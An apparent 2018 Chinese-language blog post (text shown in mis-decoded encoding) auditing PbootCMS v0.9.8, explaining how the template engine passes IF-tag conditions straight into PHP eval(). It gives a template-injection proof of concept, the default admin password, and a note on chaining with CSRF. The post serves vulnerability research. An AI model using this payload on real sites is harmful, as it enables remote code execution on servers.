<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="author" content="vQAQv"><meta name="description" content="å–œæ¬¢ç”µå½±ï¼Œå–œæ¬¢ç¾é£Ÿï¼Œå–œæ¬¢æ—…æ¸¸ï¼Œä¹Ÿå–œæ¬¢ä½ ğŸ’–~"><link rel="icon" href="/favicon.png"><title>PbootCMS v0.9.8 åå° Getshell - vQAQv's blog | Just Do It!</title><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css"><!--[if lt IE 9]><script>(function(a,b){a="abbr article aside audio bdi canvas data datalist details dialog figcaption figure footer header hgroup main mark meter nav output progress section summary template time video".split(" ");for(b=a.length-1;b>=0;b--)document.createElement(a[b])})()</script><![endif]--><script src="/js/jquery-3.1.1.min.js"></script><script src="/js/fancybox/jquery.fancybox.min.js"></script></head><body style="opacity:0"><header class="head"><h1 class="head-title u-fl"><a href="/">vQAQv's blog | Just Do It!</a></h1><nav class="head-nav u-fr"><ul class="head-nav__list"><li class="head-nav__item"><a class="head-nav__link" href="/archives">Archives</a></li><li class="head-nav__item"><a class="head-nav__link" href="/about">About Me</a></li></ul></nav></header><main class="main"><article class="post"><header class="post__head"> <time class="post__time" datetime="2018-04-11T15:50:00.000Z">å››æœˆ 11, 2018</time><h1 class="post__title"><a href="/2018/04/11/pbootcms/">PbootCMS v0.9.8 åå° Getshell</a></h1><div class="post__main echo"><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">PBOOT CMS!æƒ³ä¼±æ‰€æƒ³,è®©ä¸€åˆ‡çš†æœ‰å¯èƒ½!</div><div class="line"></div><div class="line">PBOOT CMS!ä¸ºä¼±æ‰€æƒ³,è®©ä¸€åˆ‡çš†æœ‰å¯èƒ½!</div><div class="line"></div><div class="line">PBOOT CMS!åšä¼±æ‰€æƒ³,è®©ä¸€åˆ‡çš†æœ‰å¯èƒ½!</div></pre></td></tr></table></figure>
<a id="more"></a>
<p>phpä»£ç å®¡è®¡çš„åˆå­¦è€…ï¼Œæ‰€ä»¥å°±å…ˆä»Dç±»CMSå…¥æ‰‹ã€‚</p>
<p>åå°é»˜è®¤è´¦å·ï¼š<code>admin</code> å¯†ç ï¼š<code>123456</code></p>
<p>ä»£ç å®¡è®¡åˆ†ï¼š</p>
<ul>
<li>å±é™©å‡½æ•°è¿½è¸ªæµ</li>
<li>é€šè¯»å…¨æ–‡æµ</li>
<li>é»‘ç™½ç›’ç»“åˆå®¡è®¡æµ</li>
</ul>
<h1 id="å¼€å‘è€…æ ‡ç­¾æ‰‹å†Œ"><a href="#å¼€å‘è€…æ ‡ç­¾æ‰‹å†Œ" class="headerlink" title="å¼€å‘è€…æ ‡ç­¾æ‰‹å†Œ"></a>å¼€å‘è€…æ ‡ç­¾æ‰‹å†Œ</h1><h2 id="IFæ¡ä»¶è¯­å¥"><a href="#IFæ¡ä»¶è¯­å¥" class="headerlink" title="IFæ¡ä»¶è¯­å¥"></a>IFæ¡ä»¶è¯­å¥</h2><ul>
<li><code>æ³¨æ„ï¼šæ¡ä»¶è¯­å¥ä¸­å­—ç¬¦ä¸²éœ€è¦ç”¨å•å¼•å·æˆ–åŒå¼•å·ï¼Œæ¡ä»¶ä¹Ÿå¯ä»¥ä½¿ç”¨åŸç”ŸPHPä»£ç ï¼›
æ‰€æœ‰å¯¹å…¶å®ƒæ ‡ç­¾çš„è°ƒç”¨éƒ½ä¸ºå­—ç¬¦ä¸²ï¼Œéœ€è¦åŠ å•å¼•å·ã€‚</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">&#123;pboot:<span class="keyword">if</span>(<span class="string">'a'</span>==<span class="string">'b'</span>)&#125;</div><div class="line">	å†…å®¹<span class="number">1</span></div><div class="line">&#123;<span class="keyword">else</span>&#125;</div><div class="line">	å†…å®¹<span class="number">2</span></div><div class="line">&#123;/pboot:<span class="keyword">if</span>&#125;</div></pre></td></tr></table></figure>
<ul>
<li>ç¤ºä¾‹ä¸€ï¼šåœ¨IFä¸­ä½¿ç”¨PHPå‡½æ•°ç¤ºä¾‹ï¼š</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;pboot:<span class="keyword">if</span>(date(<span class="string">'Y'</span>)==<span class="number">2018</span>)&#125;<span class="number">2018</span>å¹´&#123;/pboot:<span class="keyword">if</span>&#125;</div></pre></td></tr></table></figure>
<ul>
<li><p>ç¤ºä¾‹äºŒï¼šé«˜äº®æ ç›®ç¤ºä¾‹ï¼š</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;div class="nav"&gt;</div><div class="line">&lt;dl&gt;</div><div class="line">     &lt;dt&gt;&lt;a href="&#123;pboot:sitepath&#125;/" &#123;pboot:if(0=='&#123;sort:scode&#125;')&#125;class='active'&#123;/pboot:if&#125;&gt;é¦–é¡µ&lt;/a&gt;&lt;/dt&gt;</div><div class="line">&lt;/dl&gt;</div><div class="line">&#123;pboot:nav parent=0&#125;</div><div class="line">&lt;dl&gt;</div><div class="line">	&lt;dt&gt;&lt;a href="[nav:link]" &#123;pboot:if('[nav:scode]'=='&#123;sort:tcode&#125;')&#125;class='active'&#123;/pboot:if&#125;&gt;[nav:name]&lt;/a&gt;&lt;/dt&gt;</div><div class="line">	&lt;dd&gt;</div><div class="line">	&#123;pboot:2nav parent=[nav:scode]&#125;</div><div class="line">		&lt;a href="[2nav:link]"  &#123;pboot:if('[2nav:scode]'=='&#123;sort:scode&#125;')&#125;class='active'&#123;/pboot:if&#125;&gt;[2nav:name]&lt;/a&gt; |</div><div class="line">	&#123;/pboot:2nav&#125;</div><div class="line">	&lt;/dd&gt;</div><div class="line">&lt;/dl&gt;</div><div class="line">&#123;/pboot:nav&#125;</div><div class="line">&lt;/div&gt;</div></pre></td></tr></table></figure>
</li>
<li><p>ç¤ºä¾‹ä¸‰ï¼šåµŒå¥—IFï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&#123;pboot:<span class="keyword">if</span>(<span class="string">'a'</span>==<span class="string">'b'</span>)&#125;</div><div class="line">	&#123;pboot:<span class="number">2</span><span class="keyword">if</span>(<span class="string">'a'</span>==<span class="string">'b'</span>)&#125;</div><div class="line">		å†…å®¹<span class="number">1</span></div><div class="line">	&#123;<span class="number">2</span><span class="keyword">else</span>&#125;</div><div class="line">		å†…å®¹<span class="number">2</span></div><div class="line">	&#123;/pboot:<span class="number">2</span><span class="keyword">if</span>&#125;</div><div class="line">&#123;<span class="keyword">else</span>&#125;</div><div class="line">	å†…å®¹<span class="number">3</span></div><div class="line">&#123;/pboot:<span class="keyword">if</span>&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>è¿™é‡Œè¯´äº†å¯æ‰§è¡ŒPHPè¯­å¥ï¼Œä½†è¦æ’åœ¨<code>IFæ¡ä»¶æ ‡ç­¾</code>ï¼Œä¾‹å¦‚ï¼š</p>
<p><code>{pboot:if(phpè¯­å¥)} {/pboot:if}</code></p>
<p>ç„¶åå†è¿”å›æ–‡ä»¶æŸ¥çœ‹æºä»£ç æ–‡ä»¶ï¼š</p>
<p>è¯¥æ–‡ä»¶æ˜¯ï¼šæ ‡ç­¾è§£æå¼•æ“æ§åˆ¶å™¨ï¼Œä¹Ÿå°±æ˜¯è§£ææ ‡ç­¾çš„ã€‚</p>
<p>ä»£ç çš„<code>1273~1314</code>ä¸ºå…³äºIFæ¡ä»¶è¯­å¥çš„ã€‚</p>
<p><code>/apps/home/controller/ParserController.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// è§£æIFæ¡ä»¶æ ‡ç­¾</span></div><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parserIfLabel</span><span class="params">($content)</span></span></div><div class="line">&#123;</div><div class="line">    $pattern = <span class="string">'/\&#123;pboot:if\(([^&#125;]+)\)\&#125;([\s\S]*?)\&#123;\/pboot:if\&#125;/'</span>;</div><div class="line">    $pattern2 = <span class="string">'/pboot:([0-9])+if/'</span>;</div><div class="line">    <span class="keyword">if</span> (preg_match_all($pattern, $content, $matches)) &#123;</div><div class="line">        $count = count($matches[<span class="number">0</span>]);</div><div class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $count; $i ++) &#123;</div><div class="line">            $flag = <span class="string">''</span>;</div><div class="line">            $out_html = <span class="string">''</span>;</div><div class="line">            <span class="keyword">eval</span>(<span class="string">'if('</span> . $matches[<span class="number">1</span>][$i] . <span class="string">')&#123;$flag="if";&#125;else&#123;$flag="else";&#125;'</span>);</div><div class="line">            </div><div class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/([\s\S]*)?\&#123;else\&#125;([\s\S]*)?/'</span>, $matches[<span class="number">2</span>][$i], $matches2)) &#123; <span class="comment">// åˆ¤æ–­æ˜¯å¦å­˜åœ¨else</span></div><div class="line">                <span class="keyword">switch</span> ($flag) &#123;</div><div class="line">                    <span class="keyword">case</span> <span class="string">'if'</span>: <span class="comment">// æ¡ä»¶ä¸ºçœŸ</span></div><div class="line">                        <span class="keyword">if</span> (<span class="keyword">isset</span>($matches2[<span class="number">1</span>])) &#123;</div><div class="line">                            $out_html = $matches2[<span class="number">1</span>];</div><div class="line">                        &#125;</div><div class="line">                        <span class="keyword">break</span>;</div><div class="line">                    <span class="keyword">case</span> <span class="string">'else'</span>: <span class="comment">// æ¡ä»¶ä¸ºå‡</span></div><div class="line">                        <span class="keyword">if</span> (<span class="keyword">isset</span>($matches2[<span class="number">2</span>])) &#123;</div><div class="line">                            $out_html = $matches2[<span class="number">2</span>];</div><div class="line">                        &#125;</div><div class="line">                        <span class="keyword">break</span>;</div><div class="line">                &#125;</div><div class="line">            &#125; <span class="keyword">elseif</span> ($flag == <span class="string">'if'</span>) &#123;</div><div class="line">                $out_html = $matches[<span class="number">2</span>][$i];</div><div class="line">            &#125;</div><div class="line">            </div><div class="line">            <span class="comment">// æ— é™æåµŒå¥—è§£æ</span></div><div class="line">            <span class="keyword">if</span> (preg_match($pattern2, $out_html, $matches3)) &#123;</div><div class="line">                $out_html = str_replace(<span class="string">'pboot:'</span> . $matches3[<span class="number">1</span>] . <span class="string">'if'</span>, <span class="string">'pboot:if'</span>, $out_html);</div><div class="line">                $out_html = str_replace(<span class="string">'&#123;'</span> . $matches3[<span class="number">1</span>] . <span class="string">'else&#125;'</span>, <span class="string">'&#123;else&#125;'</span>, $out_html);</div><div class="line">                $out_html = <span class="keyword">$this</span>-&gt;parserIfLabel($out_html);</div><div class="line">            &#125;</div><div class="line">            </div><div class="line">            <span class="comment">// æ‰§è¡Œæ›¿æ¢</span></div><div class="line">            $content = str_replace($matches[<span class="number">0</span>][$i], $out_html, $content);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $content;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>å…³é”®åœ¨ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$pattern = <span class="string">'/\&#123;pboot:if\(([^&#125;]+)\)\&#125;([\s\S]*?)\&#123;\/pboot:if\&#125;/'</span>;</div><div class="line">$pattern2 = <span class="string">'/pboot:([0-9])+if/'</span>;</div><div class="line"><span class="keyword">if</span> (preg_match_all($pattern, $content, $matches)) &#123;</div><div class="line">    $count = count($matches[<span class="number">0</span>]);</div><div class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $count; $i ++) &#123;</div><div class="line">        $flag = <span class="string">''</span>;</div><div class="line">        $out_html = <span class="string">''</span>;</div><div class="line">        <span class="keyword">eval</span>(<span class="string">'if('</span> . $matches[<span class="number">1</span>][$i] . <span class="string">')&#123;$flag="if";&#125;else&#123;$flag="else";&#125;'</span>);</div></pre></td></tr></table></figure>
<p>åªç»è¿‡ç®€å•çš„æ­£åˆ™åŒ¹é…ä¹‹åå°±èµ‹å€¼ï¼Œç„¶å<code>eval()</code>æ‰§è¡Œã€‚</p>
<p>åˆ°æ­¤éœ€è¦å¯»åœ¨åˆ©ç”¨ç‚¹ã€‚</p>
<h1 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h1><p>Poc:</p>
<p><code>{pboot:if(phpinfo())}!{/pboot:if}</code></p>
<p>æœ€åç»è¿‡å¯»æ‰¾ï¼Œåªè¦å‘ç°åå°èƒ½ç¼–è¾‘çš„åœ°æ–¹ï¼ŒåŸºæœ¬ä¸Šéƒ½èƒ½æ’å…¥<code>IFæ¡ä»¶è¯­å¥æ ‡ç­¾</code>å¹¶èƒ½è§£ææ‰§è¡Œã€‚</p>
<p><img src="/image/pbootcms/poc.png" alt="poc.png"></p>
<p>è®¿é—®é¦–é¡µå°±å¯ä»¥çœ‹åˆ°<code>phpinfo</code>é¡µé¢</p>
<p><img src="/image/phpinfo.png" alt="phpinfo.png"></p>
<p>ç„¶åå°è¯•äº†å¤šæ¬¡å¤šç‚¹å‡èƒ½Getshell.</p>
<h1 id="å¦å¤–"><a href="#å¦å¤–" class="headerlink" title="å¦å¤–"></a>å¦å¤–</h1><p>å‰å°æŸå¤„å­˜åœ¨CSRFï¼Œåˆ©ç”¨å…¶ä¿®æ”¹åå°å†…å®¹ï¼Œä½†å‡æœ‰æå‡<code>ä¿®æ”¹æˆåŠŸ</code>çš„é¡µé¢ï¼Œåšä¸åˆ°æ— æ„ŸçŸ¥ä¿®æ”¹å†…å®¹ï¼Œå› æ­¤<code>CSRF+IFæ¡ä»¶è¯­å¥æ ‡ç­¾</code>ä¹Ÿæ˜¯æ¯”è¾ƒé¸¡è‚‹ã€‚</p>
<p><img src="/image/pbootcms/mod.png" alt="mod.png"></p>
</div></header><footer class="post__foot u-cf"><ul class="post__tag u-fl"><li class="post__tag__item"><a class="post__tag__link" href="/tags/ä»£ç å®¡è®¡/">ä»£ç å®¡è®¡</a></li><li class="post__tag__item"><a class="post__tag__link" href="/tags/CMS/">CMS</a></li></ul></footer></article><section class="reward"> <a class="btn-reward" href="#">Contact me</a><div class="reward-wrapper clearfix"><img src="/img/wechat.png" title="å¾®ä¿¡"></div></section></main><footer class="foot"><div class="foot-copy">&copy; 2016-2018 vQAQv</div></footer><script src="/js/scroller.js"></script><script src="/js/main.js"></script></body></html>